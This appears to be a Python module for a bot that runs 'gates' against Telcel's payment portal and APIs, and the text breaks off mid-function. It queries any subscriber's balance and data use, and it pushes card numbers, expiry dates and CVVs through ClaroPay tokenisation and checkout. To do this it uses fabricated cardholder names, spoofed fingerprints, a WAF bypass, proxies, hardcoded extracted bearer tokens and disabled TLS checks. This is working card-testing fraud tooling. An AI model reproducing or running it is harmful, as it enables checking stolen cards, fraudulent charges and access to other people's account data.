"""Gates Telcel (fuente: evidencias/apiTelcel, 2026-10-20).

- gate_saldo:  consulta de saldo vía API móvil Mi Telcel (Bearer fijo).
- gate_megas:  consulta de consumos de datos vía pay.telcel.com
               (bypass WAF Stormcaster) + iframe Mi Telcel.
- gate_factura: pago del saldo pendiente (Amigo Paguitos) con tarjeta
                vía ClaroPay (tokenización Vesta/T1Pagos + darmstatium).
- gate_recarga: recarga con tarjeta (saldo, amigo sin límite, internet
                amigo, internet en tu tiempo).

Los cuatro son síncronos (WASM + red + criptografía): los handlers los
corren con asyncio.to_thread para no bloquear el event loop del bot.

Nunca registrar los números completos ni datos de tarjeta en los logs.
"""
from __future__ import annotations

import base64
import datetime
import json
import os
import random
import re
import time
import uuid
import urllib3
import ssl

import requests
from urllib3.util import create_urllib3_context
from requests.adapters import HTTPAdapter
from curl_cffi.requests import Session
import logging
from cryptography.hazmat.primitives import hashes, padding
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

logger = logging.getLogger(__name__)

from bot.config import (
    TELCEL_DECRYPT_PASSWORD,
    TELCEL_ENCRYPT_PASSWORD,
    TELCEL_MITELCEL_BEARER,
    TELCEL_PROXY,
    TELCEL_T1_BEARER,
)
from .wafSolver.stormCasterCse import StormCasterCSE

# Solo se silencian los warnings de SSL inseguro puntuales (endpoints
# legacy de Telcel con verify=False explícito), no todos los warnings.
import warnings

warnings.filterwarnings(
    "ignore",
    message="Unverified HTTPS request",
    category=urllib3.exceptions.InsecureRequestWarning,
)

# Secrets vía entorno (Fase 1). Compatibilidad: si el .env aún no los
# define, se usan los valores legacy para no romper producción hasta
# que Fernando los rote. Marcar como deprecated en logs al arrancar.
DECRYPT_PASSWORD = TELCEL_DECRYPT_PASSWORD or "ranDlathEMYraTEFulINmAgi"
ENCRYPT_PASSWORD = TELCEL_ENCRYPT_PASSWORD or "pd2oQTuQ6AFuFVAF"

# Bearer de T1Pagos embebido en el portal (exp ~2028). Si el portal lo
# rota, se extrae del JS de pay.telcel.com y se actualiza en el .env
# como TELCEL_T1_Bearer (ya no en el código).
_LEGACY_T1_BEARER = (
    "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9."
    "eyJhdWQiOiI0IiwianRpIjoiZjNhM2I4MjMwMWI1NzcyZDVmYjk2MThkZWZhNTZkY2M3ZmUxNDcwNDE1MzA0YTU5ZjIxNDgyOTBlZjZkMjgxNTM1MGRiYTY1OWQ3NzMzYzgiLCJpYXQiOjE3NzY3Mjc4MDQuMDA4MDMsIm5iZiI6MTc3NjcyNzgwNC4wMDgwMzIsImV4cCI6MTgzOTg4NjIwNC4wMDM5MDYsInN1YiI6IjcxIiwic2NvcGVzIjpbImNsaWVudGUtdGFyamV0YXMiLCJjbGllbnRlLWNsaWVudGVzIl19."
    "kKYlWwJSK_ImR5mNtbHFKxzAnBK2srW6zMVxOmhrcET4L99yRWuXEnMLU_yHJThJtnCvlKeLhH9X5FfUOA1thdqdEXneYDpQabBuOn5lC7mgpZbsq6JSKs7hZ3PJabMTAkDalaTrBhlGehFU4P_VMlWSGo6EBuBs1-5c7IO-nevbJ9bMtDFB33CPAIGVsKQlefgxkAe70sP-vUP5r2uv0QaUiWS3PdOJ0UGwYYUlp0rDX54xNj9BH-2PfvsSxi99l-jzJ30_topOlpRlFGkld6xeJn_k7iH4M5FSk0EfcTedbMn6QCZtyh6k4UahWLLnk_aH8_BwkzUsr1PZaz8szDR5lP_s43-NgC8-Po41f3tJsmtB9L8pN3TYzF9Vpd4E2Gj321HLi1q2wwRgZnadAmlPq6_GyDzUkRfm0_J6nh7C21OFUnAn2sakCV_8SC6_vwHm2EhITNuFOauAlYwXyx6BttIUsPbm6U4QwPWg_YYZOkc_dnQ-YduUUSipsTwujB68ZFwbX8JB-bg9y_0ILsNhwoRtd98h3AUGff_oeYnhPKUt5VRwqKBpU9xhfx7-tQV5zVQU_jgPud9Y9FGTlE1nQsX6QQ9oi6gyKbb0df9JBvBr0_nZBxCYs0R5uRTwV7drIfexzFUtKAIK6RCrwWidbvWuE3fGEUtnOojhaeg"
)
T1_BEARER = TELCEL_T1_BEARER or _LEGACY_T1_BEARER

BASE_UA = (
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36"
)
CH_UA = '"Google Chrome";v="155", "Chromium";v="155", "Not(A:Brand";v="24"'

# idService / idExternal (productId) por tipo y monto: catálogo del portal.
PRODUCTOS = {
    "saldo": {
        10: ("143", "266"), 20: ("143", "236"), 30: ("143", "267"),
        50: ("143", "238"), 80: ("143", "268"), 100: ("143", "239"),
        150: ("143", "240"), 200: ("143", "241"), 300: ("143", "242"),
        500: ("143", "243"),
    },
    "amigo_sin_limite": {
        10: ("146", "387"), 20: ("146", "249"), 30: ("146", "250"),
        50: ("146", "252"), 80: ("146", "254"), 100: ("146", "256"),
        150: ("146", "258"), 200: ("146", "260"), 270: ("146", "486"),
        300: ("146", "262"), 400: ("146", "487"), 500: ("146", "264"),
        1200: ("146", "491"), 2400: ("146", "490"),
    },
    "internet_amigo": {
        10: ("146", "388"), 20: ("146", "248"), 30: ("146", "251"),
        50: ("146", "253"), 80: ("146", "255"), 100: ("146", "257"),
        150: ("146", "259"), 200: ("146", "261"), 300: ("146", "263"),
        500: ("146", "265"),
    },
    "internet_tiempo": {
        10: ("146", "386"), 15: ("146", "385"), 25: ("146", "495"),
        30: ("146", "497"), 99: ("146", "498"),
    },
}

_PROXY = {"https": TELCEL_PROXY, "http": TELCEL_PROXY} if TELCEL_PROXY else None


class GateError(Exception):
    """Fallo de un paso del flujo: mensaje para log + body para debug."""

    def __init__(self, paso: str, detalle: str = "", body: str = ""):
        super().__init__(f"{paso}: {detalle}")
        self.paso = paso
        self.detalle = detalle or paso
        self.body = body[:300]


def _chrome_headers(referer: str, extra: dict | None = None) -> dict:
    """Encabezados base del portal web. Se completan con uzlc por llamada."""
    h = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "es-ES,es;q=0.9",
        "sec-ch-ua": CH_UA,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Linux"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": BASE_UA,
        "referer": referer,
        "origin": "https://pay.telcel.com",
    }
    if extra:
        h.update(extra)
    return h


def _uzlc(curl, cse) -> str:
    return cse.get_uzlc({c.name: c.value for c in curl.cookies.jar})


def clean_card(text: str) -> dict:
    """Toma cc|mm|yy|cvv (admite | / espacios) y devuelve el dict limpio."""
    parts = [p for p in re.split(r"[\s|/]+", text.strip()) if p]
    if len(parts) != 4:
        raise ValueError("formato de tarjeta inválido")
    n, m, y, cvv = parts
    n = n.strip()
    if not n.isdigit() or len(n) not in (15, 16):
        raise ValueError("PAN inválido")
    if not m.isdigit() or not 1 <= int(m) <= 12:
        raise ValueError("mes inválido")
    if not y.isdigit():
        raise ValueError("año inválido")
    if not cvv.isdigit() or len(cvv) not in (3, 4):
        raise ValueError("CVV inválido")
    return {
        "number": n,
        "month": m.zfill(2),
        "year": y[-2:],
        "cvv": cvv,
    }


def clean_card_safe(text: str) -> dict | None:
    try:
        return clean_card(text)
    except ValueError:
        return None


def clean_phone(phone: str) -> tuple[str, str]:
    n = "".join(c for c in phone if c.isdigit())
    if len(n) > 10:
        n = n[-10:]
    if len(n) != 10:
        raise ValueError("teléfono inválido")
    return n, f"+52{n}"


def clean_account(cuenta: str) -> str:
    n = "".join(c for c in cuenta if c.isdigit())
    if len(n) < 8:
        raise ValueError("cuenta inválida")
    return n


def _genname() -> tuple[str, str]:
    first = random.choice(
        ["James", "John", "Robert", "Michael", "William", "David", "Richard"]
    )
    last = random.choice(["Smith", "Johnson", "Williams", "Brown", "Garcia", "Martinez"])
    return first, last


def decrypt_data(payload: str, password: str = DECRYPT_PASSWORD) -> dict:
    salt, iv, ct = [base64.b64decode(x) for x in payload.split("|")]
    key = PBKDF2HMAC(
        algorithm=hashes.SHA256(), length=32, salt=salt, iterations=250000
    ).derive(password.encode())
    dec = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
    unp = padding.PKCS7(128).unpadder()
    text = (unp.update(dec.update(ct) + dec.finalize()) + unp.finalize()).decode()
    return json.loads(text)


def encrypt_data(obj: dict, password: str = ENCRYPT_PASSWORD) -> str:
    salt, iv = os.urandom(16), os.urandom(16)
    key = PBKDF2HMAC(
        algorithm=hashes.SHA256(), length=32, salt=salt, iterations=250000
    ).derive(password.encode())
    pad = padding.PKCS7(128).padder()
    enc = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    ct = enc.update(
        pad.update(json.dumps(obj, separators=(",", ":")).encode()) + pad.finalize()
    ) + enc.finalize()
    return "|".join(base64.b64encode(x).decode() for x in (salt, iv, ct))


def _new_curl_session() -> Session:
    kw: dict = {"impersonate": "chrome"}
    if _PROXY:
        kw["proxies"] = _PROXY
    return Session(**kw)


# ---------------------------------------------------------------------------
# Passos compartidos del flujo de cobro ClaroPay (factura y recarga)
# ---------------------------------------------------------------------------
def _resolve_claro_id(line: dict, access_token: str) -> str:
    claro_id = line.get("claroId") or line.get("telcelInfo", {}).get("claroId", "")
    if not claro_id and access_token:
        try:
            jwt_payload = json.loads(
                base64.urlsafe_b64decode(access_token.split(".")[1] + "==")
            )
            claro_id = jwt_payload.get("user_id", "")
        except Exception:
            pass
    return claro_id


def _find_client_id(curl, cse, access_token: str, claro_id: str, referer: str):
    r = curl.get(
        "https://pay.telcel.com/api/iridium",
        headers=_chrome_headers(
            referer,
            {
                "accept": "*/*",
                "authorization": f"Bearer {access_token}",
                "uzlc": _uzlc(curl, cse),
            },
        ),
        params={"query": "findCustomerIDs", "claroId": claro_id},
        timeout=30,
    )
    if r.status_code not in (200, 201):
        return None
    try:
        d = r.json()
    except Exception:
        return None
    return (
        d.get("customerId")
        or d.get("clientId")
        or d.get("id")
        or d.get("cliente_id")
        or (
            d.get("customers", [{}])[0].get("customerId")
            if d.get("customers")
            else None
        )
    )


def _vesta_tokenize(pan: str) -> str:
    r = requests.post(
        "https://claropay.ecustomerpayments.com/GatewayV4ProxyJSON/"
        "Service/ChargeAccountToTemporaryToken",
        headers={
            "Referer": "https://pay.telcel.com/",
            "User-Agent": BASE_UA,
            "Content-Type": "application/json",
            "sec-ch-ua": CH_UA,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Linux"',
        },
        json={"AccountName": "claropay", "ChargeAccountNumber": pan},
        proxies=_PROXY,
        timeout=30,
    )
    token = r.json().get("ChargeAccountNumberToken", "") if r.status_code == 200 else ""
    if not token:
        raise GateError("vesta", "no se obtuvo token", body=r.text)
    return token


def _headers_dispersion(curl, cse, referer: str, with_credential: str = "") -> dict:
    extra = {"uzlc": _uzlc(curl, cse)}
    if with_credential:
        extra["x-portal-credential"] = with_credential
        extra["cp-bi"] = "com.claropay.web.portalpagos"
    return _chrome_headers(referer, extra)


def _headers_authorized(curl, cse, access_token: str, referer: str) -> dict:
    return _chrome_headers(
        referer,
        {
            "accept": "*/*",
            "authorization": f"Bearer {access_token}",
            "uzlc": _uzlc(curl, cse),
        },
    )


def _t1_create_client(claro_id: str):
    r = requests.post(
        "https://api-claropay.t1pagos.com/v1/cliente",
        headers={
            "accept": "*/*",
            "accept-language": "es-ES,es;q=0.9",
            "authorization": f"Bearer {T1_BEARER}",
            "content-type": "application/json",
            "origin": "https://pay.telcel.com",
            "sec-ch-ua": CH_UA,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Linux"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": BASE_UA,
        },
        json={"id_externo": claro_id},
        proxies=_PROXY,
        timeout=30,
    )
    try:
        body = r.json()
    except Exception:
        body = {}
    if r.status_code in (200, 201):
        return (
            body.get("data", {}).get("cliente", {}).get("id")
            or body.get("id")
            or body.get("clienteId")
        )
    if r.status_code == 412:
        m = re.search(
            r"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})",
            body.get("error", {}).get("message", ""),
        )
        return m.group(1) if m else None
    raise GateError("t1pagos cliente", str(r.status_code), body=r.text)


def _t1_add_card(c, client_id, first: str, last: str):
    r = requests.post(
        "https://api-claropay.t1pagos.com/v1/tarjeta",
        headers={
            "accept": "*/*",
            "accept-language": "es-ES,es;q=0.9",
            "authorization": f"Bearer {T1_BEARER}",
            "content-type": "application/json",
            "origin": "https://pay.telcel.com",
            "sec-ch-ua": CH_UA,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Linux"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": BASE_UA,
        },
        json={
            "cargo_unico": False,
            "cvv2": c["cvv"],
            "default": False,
            "expiracion_anio": c["year"],
            "expiracion_mes": c["month"],
            "nombre": f"{first} {last}",
            "pan": c["number"],
            "cliente_id": client_id,
        },
        proxies=_PROXY,
        timeout=30,
    )
    if r.status_code not in (200, 201, 409, 412):
        raise GateError("t1pagos tarjeta", str(r.status_code), body=r.text)
    try:
        body = r.json()
    except Exception:
        body = {}
    return (
        body.get("data", {}).get("tarjeta", {}).get("token")
        or body.get("token")
        or body.get("id")
    )


def _iridium_link_customer(curl, cse, access_token: str, claro_id: str, client_id, referer: str):
    r = curl.post(
        "https://pay.telcel.com/api/iridium",
        headers=_chrome_headers(
            referer,
            {
                "accept": "*/*",
                "authorization": f"Bearer {access_token}",
                "content-type": "application/json",
                "cp-bi": "pay.telcel.com",
                "cp-bv": "4.110.103",
                "cp-so": "web",
                "uzlc": _uzlc(curl, cse),
            },
        ),
        json={
            "email": f"cp-0000000000-{uuid.uuid4()}@claropay.com",
            "customer": {
                "claroId": claro_id,
                "personId": claro_id,
                "processor": "t1pagos",
                "customerId": client_id,
            },
        },
        timeout=30,
    )
    if r.status_code not in (200, 201, 204):
        raise GateError("iridium vincula", str(r.status_code), body=r.text)


def _germanium_register_card(
    curl, cse, access_token, claro_id, c, card_token, first: str, last: str, referer: str
):
    r = curl.post(
        "https://pay.telcel.com/api/germanium",
        headers=_chrome_headers(
            referer,
            {
                "accept": "*/*",
                "authorization": f"Bearer {access_token}",
                "content-type": "application/json",
                "cp-bi": "pay.telcel.com",
                "cp-bv": "4.110.103",
                "cp-so": "web",
                "uzlc": _uzlc(curl, cse),
            },
        ),
        json={
            "msisdn": "0000000000",
            "externalId": str(uuid.uuid4()),
            "card": {
                "tokens": [{"platform": "1", "value": card_token}],
                "expirationDate": f"{c['month']}{c['year']}",
                "lastDigits": c["number"][-4:],
                "bin": c["number"][:6],
                "mark": "2",
                "acceptTermsAndConditions": True,
            },
            "deviceData": None,
            "canDeviceData": False,
            "latitude": "0.0",
            "longitude": "0.0",
            "appVersion": "1.0",
            "claroId": claro_id,
            "name": f"{first} {last}",
            "isDefault": "0",
            "cardName": "",
        },
        timeout=30,
    )
    if r.status_code not in (200, 201, 204):
        raise GateError("germanium", str(r.status_code), body=r.text)


def _fermium_fee(curl, cse, access_token, claro_id: str, referer: str, card_token: str):
    r = curl.post(
        "https://pay.telcel.com/api/fermium",
        headers=_chrome_headers(
            referer,
            {
                "accept": "*/*",
                "authorization": f"Bearer {access_token}",
                "content-type": "application/json",
                "cp-bi": "pay.telcel.com",
                "cp-bv": "4.110.103",
                "uzlc": _uzlc(curl, cse),
            },
        ),
        json={
            "appVersion": "1.0",
            "externalId": str(uuid.uuid4()),
            "claroId": claro_id,
            "latitude": "0.0",
            "longitude": "0.0",
            "msisdn": "0000000000",
        },
        timeout=30,
    )
    if r.status_code not in (200, 201, 204):
        raise GateError("fermium", str(r.status_code), body=r.text)
    body = r.json() if r.content else {}
    commission = str(body.get("commission") or body.get("totalCommission") or "0")
    card_list = body.get("cardList", [])
    darm_token = card_token
    if card_list:
        darm_token = (
            card_list[0].get("cardId")
            or card_list[0].get("card", {}).get("tokens", [{}])[0].get("value")
            or card_token
        )
    return commission, darm_token


def _hafnium_antifraud(curl, cse, access_token: str, referer: str) -> None:
    curl.post(
        "https://pay.telcel.com/api/hafnium/getSessionTags",
        headers=_chrome_headers(
            referer,
            {
                "accept": "*/*",
                "authorization": f"Bearer {access_token}",
                "content-type": "application/json",
                "uzlc": _uzlc(curl, cse),
            },
        ),
        json={
            "appVersion": "4.70.908",
            "externalId": str(uuid.uuid4()),
            "latitude": "0.0",
            "longitude": "0.0",
            "msisdn": "0000000000",
        },
        timeout=30,
    )


def _drmstatium_checkout(curl, cse, access_token, payload: dict, referer: str):
    r = curl.post(
        "https://pay.telcel.com/api/darmstatium",
        headers=_chrome_headers(
            referer,
            {
                "accept": "*/*",
                "authorization": f"Bearer {access_token}",
                "content-type": "application/json",
                "cp-bi": "pay.telcel.com",
                "cp-bv": "4.110.103",
                "cp-so": "web",
                "uzlc": _uzlc(curl, cse),
            },
        ),
        json={"data": encrypt_data(payload)},
        timeout=60,
    )
    try:
        resp = r.json()
    except Exception:
        raise GateError("darmstatium", str(r.status_code), body=r.text)
    spi = resp.get("servicePaymentInfo") or {}
    subj = resp.get("responseSubject", "")
    ok = bool(spi) or subj == "SUCCESS"
    return ok, resp.get("responseMessage"), subj, spi


def _checkout_payload(
    *,
    c: dict,
    claro_id: str,
    client_id,
    first: str,
    last: str,
    destination: str,
    product_id: str,
    service_id: str,
    service_name: str,
    amount,
    commission: str,
    darm_token: str,
) -> dict:
    exp = f"{c['month']}{c['year']}"
    return {
        "accountHolder": {
            "accountCreateWebSessionID": "",
            "accountCreationDate": datetime.date.today().isoformat(),
            "accountHolderAddress": {
                "city": "",
                "countryCodeId": "484",
                "externalNumber": "",
                "internalNumber": "",
                "postalCode": "",
                "region": "",
                "street": "",
                "suburb": "",
            },
            "birthdate": "",
            "card": {
                "expirationDate": exp,
                "lastDigits": c["number"][-4:],
                "type": "2",
                "mark": "2",
                "tokens": [{"platform": 1, "value": darm_token}],
                "recurring": False,
                "bins": c["number"][:6],
                "cvv": c["cvv"],
            },
            "firstName": first,
            "governmentId": {"idNumber": "", "idType": "2"},
            "lastName": last,
            "secondLastName": "",
        },
        "appVersion": "1.0",
        "checkPayment": True,
        "claroId": claro_id,
        "clientIdT1": client_id,
        "control": str(uuid.uuid4().int)[:12],
        "destinationAccountId": destination,
        "deviceFingerprint": f"_0000000000_{uuid.uuid4().hex}_{uuid.uuid4().int & 0xFFFFFFFF}",
        "externalId": str(uuid.uuid4()),
        "inquiryTelmexId": "",
        "isClaroSocio": False,
        "latitude": "0.0",
        "longitude": "0.0",
        "makePayment": False,
        "msisdn": "0000000000",
        "paymentChannel": 7,
        "paymentDescription": "Pago desde portal telcel",
        "paymentRoute": "1",
        "productId": product_id,
        "serviceId": service_id,
        "serviceName": service_name,
        "sessionId": f"S{uuid.uuid4().int >> 64}",
        "totalAmount": str(amount),
        "totalCommission": commission,
    }


# ---------------------------------------------------------------------------
# Gates de consulta
# ---------------------------------------------------------------------------
def gate_saldo(telefono: str) -> dict:
    """Consulta de saldo vía API móvil de Mi Telcel (Bearer fijo)."""
    num, msisdn = clean_phone(telefono)
    ts = time.time()
    headers = {
        "Host": "mitelcel.smapps.mx:446",
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Accept-Language": "es-MX,es-419;q=0.9,es;q=0.8",
        "User-Agent": "Mi%20Telcel/2 CFNetwork/3860.300.31 Darwin/25.2.0",
        "Connection": "keep-alive",
        "Authorization": f"Bearer {TELCEL_MITELCEL_BEARER}",
    }
    body = {
        "apprequesttime": f"{time.time() * 1000:.6f}",
        "tipoRequest": "1",
        "argumentos": {
            "deviceId": "iPhone",
            "dispositivo": "IPH",
            "telefono": msisdn,
            "perfil": "AMIGO",
            "region": "4",
            "tecnologia": "2",
            "email": "null",
            "version": "14.9.5",
            "so": "iOS 26.2",
        },
        "wifi2Go": "false",
    }
    try:
        # Endpoint legacy Mi Telcel (puerto 446, TLS antiguo): requiere
        # _LegacySSL; verify=False acotado solo a este host.
        r = requests.post(
            "https://mitelcel.smapps.mx:446/MiTelcelJAVA/USUARIO/1.0.0/v4/saldo_prepago",
            headers=headers,
            json=body,
            verify=False,
            timeout=20,
            proxies=_PROXY,
        ).json()
    except Exception as exc:
        return {
            "status": "error",
            "message": "No se pudo consultar el saldo en este momento.",
            "detail": str(exc),
        }
    if r.get("codigoRespuesta") != 0:
        return {
            "status": "error",
            "message": "Telcel rechazó la consulta de saldo.",
            "detail": r.get("mensajeRespuesta", ""),
        }
    saldos = {s["nombre"].strip().rstrip(":"): s["valor"] for s in r.get("saldos", [])}
    extras = {
        s["nombre"].strip().rstrip(":"): s["valor"] for s in r.get("saldosSecundarios", [])
    }
    vencimiento = r["saldos"][0].get("fechaExpiracion", "") if r.get("saldos") else ""
    return {
        "status": "ok",
        "phone": num,
        "saldo": saldos,
        "extras": extras,
        "vencimiento": vencimiento,
        "time": f"{round(time.time() - ts, 2)}s",
    }


class _LegacySSL(HTTPAdapter):
    """Adaptador TLS legacy solo para endpoints viejos de Telcel.

    Se limita a los hosts que lo necesitan (uat.mitelcel.com); el resto
    del proyecto valida TLS normal. Fase 1: antes era global vía
    urllib3.disable_warnings() + verify=False indiscriminado.
    """

    LEGACY_HOSTS = ("uat.mitelcel.com", "mitelcel.smapps.mx")

    def init_poolmanager(self, *args, **kwargs):
        ctx = create_urllib3_context()
        # uat.mitelcel.com usa DH de 1024 bits: SECLEVEL=0 + cipher legacy.
        # Solo para este host (montado explícito), no global.
        ctx.set_ciphers("DEFAULT:@SECLEVEL=0")
        try:
            ctx.set_ciphers("DEFAULT:@SECLEVEL=0:ADH-AES256-SHA:ADH-AES128-SHA")
        except Exception:
            pass
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        kwargs["ssl_context"] = ctx
        return super().init_poolmanager(*args, **kwargs)


def gate_megas(telefono: str) -> dict:
    """Consulta de consumos de datos: pay.telcel.com + iframe Mi Telcel."""
    num, msisdn = clean_phone(telefono)
    try:
        return _gate_megas_impl(num, msisdn)
    except GateError as exc:
        return _gate_error(exc)
    except Exception as exc:
        return {
            "status": "error",
            "message": "No se pudieron consultar los consumos en este momento.",
            "detail": str(exc),
        }


def _gate_megas_impl(num: str, msisdn: str) -> dict:
    curl = _new_curl_session()
    cse = StormCasterCSE(verbose=False)

    cse.solve(curl, "https://pay.telcel.com/")

    referer = "https://pay.telcel.com/consultaMegas/7?rsd=1"
    r1 = curl.post(
        "https://pay.telcel.com/api/erbium",
        headers=_chrome_headers(
            referer, {"content-type": "application/json", "uzlc": _uzlc(curl, cse), "priority": "u=1, i"}
        ),
        json={"msisdn": msisdn},
        timeout=30,
    )
    if r1.status_code != 200:
        raise GateError("erbium", str(r1.status_code), body=r1.text)
    credential = r1.json()["credential"]

    r2 = curl.get(
        "https://pay.telcel.com/api/actinium",
        headers=_chrome_headers(
            referer,
            {
                "cp-bi": "com.claropay.web.portalpagos",
                "uzlc": _uzlc(curl, cse),
                "x-portal-credential": credential,
                "priority": "u=1, i",
            },
        ),
        params={"a": msisdn},
        timeout=30,
    )
    if r2.status_code != 200:
        raise GateError("actinium", str(r2.status_code), body=r2.text)
    line = decrypt_data(r2.json()["data"])
    tinfo = line.get("telcelInfo", {})
    iframe = tinfo.get("urlIframe")
    perfil = "AMIGO" if tinfo.get("prepago", True) else "POSTPAGO"

    mt = requests.Session()
    # Endpoint legacy uat.mitelcel.com: TLS antiguo, adaptador acotado.
    mt.mount("https://uat.mitelcel.com", _LegacySSL())
    mt.verify = False
    if _PROXY:
        mt.proxies.update(_PROXY)
    # uat.mitelcel.com usa DH de 1024 bits: OpenSSL del sistema lo rechaza
    # incluso con SECLEVEL=0. curl_cffi (BoringSSL) sí negocia. Se usa
    # curl_cffi para el iframe + frame-consumos, requests queda como fallback.
    iframe_html = ""
    try:
        if iframe:
            from curl_cffi import requests as _creq

            _creq_kw: dict = {"impersonate": "chrome", "verify": False, "timeout": 15}
            if _PROXY:
                _creq_kw["proxies"] = _PROXY
            iframe_html = _creq.get(iframe, **_creq_kw).text
    except Exception as exc:
        logger.debug("iframe curl_cffi falló, sigo con requests: %s", exc)
        if iframe:
            try:
                iframe_html = mt.get(iframe, timeout=15).text
            except Exception as exc2:
                logger.debug("iframe requests también falló: %s", exc2)

    try:
        from curl_cffi import requests as _creq2

        _post_kw: dict = {
            "impersonate": "chrome",
            "verify": False,
            "timeout": 20,
            "headers": {
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Accept-Language": "es-ES,es;q=0.9",
                "Connection": "keep-alive",
                "Content-Type": "application/json",
                "Origin": "https://uat.mitelcel.com",
                "Referer": iframe or "https://uat.mitelcel.com/mitelcel/consumo-datos/claro?translate=false",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                "User-Agent": BASE_UA,
                "X-Requested-With": "XMLHttpRequest",
                "sec-ch-ua": CH_UA,
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Linux"',
            },
            "json": {
                "telefono": tinfo.get("msisdn", num),
                "region": "4",
                "perfil": perfil,
            },
        }
        if _PROXY:
            _post_kw["proxies"] = _PROXY
        r3 = _creq2.post(
            "https://uat.mitelcel.com/mitelcel/mitelcel-api-web/api/prepago/internet/frame-consumos",
            **_post_kw,
        )
        r3_status, r3_text, r3_json = r3.status_code, r3.text, r3.json

        class _R3:
            status_code = r3_status
            text = r3_text

            def json(self):
                return r3_json()

        r3 = _R3()
    except Exception as exc:
        logger.debug("frame-consumos curl_cffi falló, uso requests: %s", exc)
        r3 = mt.post(
            "https://uat.mitelcel.com/mitelcel/mitelcel-api-web/api/prepago/internet/frame-consumos",
            headers={
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Accept-Language": "es-ES,es;q=0.9",
                "Connection": "keep-alive",
                "Content-Type": "application/json",
                "Origin": "https://uat.mitelcel.com",
                "Referer": iframe or "https://uat.mitelcel.com/mitelcel/consumo-datos/claro?translate=false",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                "User-Agent": BASE_UA,
                "X-Requested-With": "XMLHttpRequest",
                "sec-ch-ua": CH_UA,
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Linux"',
            },
            json={
                "telefono": tinfo.get("msisdn", num),
                "region": "4",
                "perfil": perfil,
            },
            timeout=20,
            proxies=_PROXY,
        )
    finally:
        try:
            mt.close()
        except Exception:
            pass
    try:
        body = r3.json()
    except Exception:
        raise GateError("frame-consumos", str(r3.status_code), body=r3.text)
    if isinstance(body.get("data"), str) and "|" in body["data"]:
        body = decrypt_data(body["data"])
    # frame-consumos a veces devuelve el payload directo en response.data
    # (sin wrapper cifrado con "|"): se acepta tal cual si trae consumos.
    return {"status": "ok", "phone": num, "perfil": perfil, "consumos": body}


def _gate_error(exc: GateError) -> dict:
    return {
        "status": "error",
        "message": "El flujo no se completó con Telcel.",
        "detail": f"{exc.detalle}",
        "body": exc.body,
    }


# ---------------------------------------------------------------------------
# Gates de cobro
# ---------------------------------------------------------------------------
def gate_factura(tarjeta: str, cuenta: str) -> dict:
    """Pago del saldo pendiente (Amigo Paguitos) con tarjeta."""
    c = clean_card_safe(tarjeta)
    if c is None:
        return {"status": "error", "message": "tarjeta inválida"}
    try:
        num_cuenta = clean_account(cuenta)
    except ValueError:
        return {"status": "error", "message": "número de cuenta inválido"}

    first, last = _genname()
    curl = _new_curl_session()
    cse = StormCasterCSE(verbose=False)
    cse.solve(curl, "https://pay.telcel.com/")
    referer = "https://pay.telcel.com/amigoPaguitos/3?rsd=1"

    r1 = curl.get(
        "https://pay.telcel.com/api/barium",
        headers=_chrome_headers(
            referer,
            {
                "cp-bi": "com.claropay.web.portalpagos",
                "uzlc": _uzlc(curl, cse),
                "priority": "u=1, i",
            },
        ),
        params={"a": num_cuenta, "b": 247},
        timeout=30,
    )
    if r1.status_code != 200:
        return _gate_error(GateError("barium", str(r1.status_code), body=r1.text))
    line = decrypt_data(r1.json()["data"])
    access_token = line["tokensDTO"]["access_token"]
    claro_id = _resolve_claro_id(line, access_token)
    pending_amt = str(line.get("balance", {}).get("pendingAmount", ""))
    if not claro_id or not access_token:
        return {"status": "error", "message": "la cuenta no devolvió sesión de ClaroPay"}

    try:
        client_id = _find_client_id(curl, cse, access_token, claro_id, referer)
        vesta_token = _vesta_tokenize(c["number"])
        t1_client = _t1_create_client(claro_id)
        client_id = client_id or t1_client
        card_token = _t1_add_card(c, client_id, first, last) or vesta_token
        _iridium_link_customer(curl, cse, access_token, claro_id, client_id, referer)
        _germanium_register_card(
            curl, cse, access_token, claro_id, c, card_token, first, last, referer
        )
        commission, darm_token = _fermium_fee(
            curl, cse, access_token, claro_id, referer, card_token
        )
        _hafnium_antifraud(curl, cse, access_token, referer)
        payload = _checkout_payload(
            c=c,
            claro_id=claro_id,
            client_id=client_id,
            first=first,
            last=last,
            destination=num_cuenta,
            product_id="",
            service_id="247",
            service_name="AMIGO PAGUITOS",
            amount=pending_amt,
            commission=commission,
            darm_token=darm_token,
        )
        ok, message, subj, spi = _drmstatium_checkout(
            curl, cse, access_token, payload, referer
        )
    except GateError as exc:
        return _gate_error(exc)

    return {
        "status": "ok" if ok else "declined",
        "gateway": "Pago Factura/ClaroPay",
        "message": message,
        "responseSubject": subj,
        "serviceName": spi.get("serviceName"),
        "chargeDate": spi.get("chargeDate"),
        "chargeAmount": spi.get("chargeAmount"),
